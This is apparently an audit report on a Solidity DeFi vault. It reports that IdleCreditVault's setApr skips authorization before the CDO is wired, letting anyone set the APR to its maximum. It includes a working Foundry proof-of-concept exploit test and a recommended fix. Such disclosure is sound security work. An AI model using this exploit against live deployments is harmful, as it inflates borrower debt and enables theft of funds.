### Title
Unprivileged APR takeover before CDO wiring inflates borrower debt - ([File: contracts/strategies/idle/IdleCreditVault.sol])

### Summary
`IdleCreditVault.setApr` intentionally skips its CDO/manager authorization check while `idleCDO == address(0)`. During a non-atomic deployment sequence, an unprivileged attacker can call `setAprs` after strategy initialization but before `setWhitelistedCDO`, setting both `unscaledApr` and `lastApr` to the maximum `DEFAULT_MAX_APR`. Once the honest owner links the CDO, the attacker-controlled APR persists and future epochs calculate borrower obligations from the unauthorized rate.

### Finding Description
`initialize` sets `maxApr` to `DEFAULT_MAX_APR` but leaves `idleCDO` unset. [1](#0-0) 

`setApr` rejects callers other than the CDO or manager only when `idleCDO` is non-zero. Therefore, during the setup gap, any EOA can set `lastApr` to `20e18`, the maximum allowed scaled APR. [2](#0-1) 

`setAprs` compounds the issue by first writing attacker-controlled `unscaledApr` and then invoking the bypassable `setApr`. [3](#0-2) 

The factory performs configuration atomically, but manual deployment tooling explicitly permits a separate transaction to set `setWhitelistedCDO`, leaving a production deployment window in which the guard is disabled. [4](#0-3) 

Afterward, the CDO uses `_getStrategyApr()` through `_calcInterest` when calculating epoch obligations and withdrawal entitlements. [5](#0-4) 

### Impact Explanation
An attacker who becomes a permitted lender can force the vault to accrue interest at an unauthorized 20% scaled APR instead of the intended deployment APR. The excess is a direct liability owed by the borrower and becomes claimable NAV for tranche holders.

For example, with a 36.5-day epoch and 5-day buffer, changing an intended 10% annualized rate to the maximum 20% rate increases the attacker’s epoch entitlement by approximately 1% of principal, before fees. On a 10 million-unit deposit, this creates roughly 100,000 units of unauthorized yield. If the borrower cannot fund the inflated obligation, the excess contributes to protocol insolvency/default.

### Likelihood Explanation
Likelihood is moderate because exploitation requires a deployment or migration sequence in which strategy initialization and `setWhitelistedCDO` are not atomic. That sequence exists in the repository’s task flow. No privileged malicious role is required, and the attacker needs only to submit one public transaction during the setup gap. The factory’s atomic path reduces exposure for factory-deployed vaults, but does not protect manually deployed or reconfigured vaults.

### Recommendation
Remove the special case that skips authorization when `idleCDO == address(0)`. Require `msg.sender == manager` or another explicitly configured deployer for all calls to `setApr`, `setAprs`, and `setAprsWithBuffer`, or make these functions `onlyOwner` until CDO wiring is completed. Additionally, require deployment scripts to initialize and wire the strategy atomically through a factory or deployment contract.

### Proof of Concept
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/proxy/transparent/TransparentUpgradeableProxy.sol";
import "@openzeppelin/contracts/proxy/transparent/ProxyAdmin.sol";
import "../../contracts/IdleCDOEpochVariant.sol";
import "../../contracts/strategies/idle/IdleCreditVault.sol";
import "../../contracts/interfaces/IERC20Detailed.sol";

contract PreWiringAprTakeoverPoC is Test {
    uint256 internal constant MAX_APR = 20e18;

    function test_UnprivilegedActorSetsAprBeforeCdoWiring() external {
        address underlying = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48; // USDC
        address owner = makeAddr("owner");
        address manager = makeAddr("manager");
        address borrower = makeAddr("borrower");
        address attacker = makeAddr("attacker");
        ProxyAdmin admin = new ProxyAdmin();

        IdleCreditVault strategyImpl = new IdleCreditVault();
        IdleCreditVault strategy = IdleCreditVault(address(new TransparentUpgradeableProxy(
            address(strategyImpl),
            address(admin),
            abi.encodeWithSelector(
                IdleCreditVault.initialize.selector,
                underlying,
                owner,
                manager,
                borrower,
                "borrower",
                10e18
            )
        )));

        assertEq(strategy.idleCDO(), address(0));
        assertEq(strategy.getApr(), 10e18);

        // The authorization gate is completely skipped while idleCDO is unset.
        vm.prank(attacker);
        strategy.setAprs(MAX_APR, MAX_APR);

        IdleCDOEpochVariant cdoImpl = new IdleCDOEpochVariant();
        IdleCDOEpochVariant cdo = IdleCDOEpochVariant(address(new TransparentUpgradeableProxy(
            address(cdoImpl),
            address(admin),
            abi.encodeWithSelector(
                IdleCDOEpochVariant.initialize.selector,
                0,
                underlying,
                makeAddr("recovery"),
                owner,
                makeAddr("rebalancer"),
                address(strategy),
                100_000
            )
        )));

        vm.prank(owner);
        strategy.setWhitelistedCDO(address(cdo));

        // The unauthorized values survive CDO wiring.
        assertEq(strategy.idleCDO(), address(cdo));
        assertEq(strategy.unscaledApr(), MAX_APR);
        assertEq(strategy.getApr(), MAX_APR);

        // After wiring, the same attacker can no longer change the APR,
        // proving the exploit depends on bypassing the disabled setup check.
        vm.prank(attacker);
        vm.expectRevert(NotAllowed.selector);
        strategy.setApr(1e18);
    }
}
```

### Citations

**File:** contracts/strategies/idle/IdleCreditVault.sol (L124-147)
```text
  function initialize(
    address _underlyingToken,
    address _owner,
    address _manager,
    address _borrower,
    string memory borrowerName,
    uint256 _apr
  ) public virtual initializer {
    OwnableUpgradeable.__Ownable_init();
    ReentrancyGuardUpgradeable.__ReentrancyGuard_init();
    require(token == address(0), "Token is already initialized");

    //----- // -------//
    token = _underlyingToken;
    underlyingToken = IERC20Detailed(token);
    tokenDecimals = underlyingToken.decimals();
    oneToken = 10**(tokenDecimals);
    borrower = _borrower;
    manager = _manager;
    maxApr = DEFAULT_MAX_APR;
    // on the first setup we set the lastApr equal to the unscaledApr
    lastApr = _apr;
    unscaledApr = _apr;
    defaultRecoveryInitialized = true;
```

**File:** contracts/strategies/idle/IdleCreditVault.sol (L206-210)
```text
  function setAprs(uint256 _unscaledApr, uint256 _apr) external {
    unscaledApr = _unscaledApr;
    // here we also check that msg.sender is allowed
    setApr(_apr);
  }
```

**File:** contracts/strategies/idle/IdleCreditVault.sol (L225-235)
```text
  function setApr(uint256 _apr) public {
    address _cdo = idleCDO;

    // if cdo is not yet set we skip the check (this can happen only during the setup)
    if (_cdo != address(0)) {
      if (msg.sender != _cdo && msg.sender != manager) revert NotAllowed();
    }
    uint256 _maxApr = maxApr;
    if (_maxApr != 0 && _apr > _maxApr) revert NotAllowed();
    lastApr = _apr;
  }
```

**File:** tasks/cdo-factory.js (L1083-1095)
```javascript
    if (programmableBorrowerConfig) {
      const currentUnscaledApr = await strategy.unscaledApr();
      const currentApr = await strategy.getApr();
      if (!currentUnscaledApr.eq(0) || !currentApr.eq(0)) {
        console.log("Setting strategy APRs to 0 for programmable borrower mode");
        await strategy.connect(signer).setAprs(0, 0);
      }
    }

    if (strategy.setWhitelistedCDO && (await strategy.idleCDO())?.toLowerCase() != idleCDO.address.toLowerCase()) {
      console.log("Setting whitelisted CDO");
      await strategy.connect(signer).setWhitelistedCDO(idleCDO.address);
    }
```

**File:** contracts/IdleCDOEpochVariant.sol (L800-809)
```text
  function _calcInterest(uint256 _amount) internal view returns (uint256) {
    return _calcInterestWithApr(_amount, _getStrategyApr());
  }

  /// @notice Calculate the interest of an epoch for the given amount and apr
  /// @param _amount Amount of underlyings
  /// @param _apr Apr used for the calculation
  function _calcInterestWithApr(uint256 _amount, uint256 _apr) internal view returns (uint256) {
    return _amount * (_apr / 100) * epochDuration / (365 days * ONE_TRANCHE_TOKEN);
  }
```
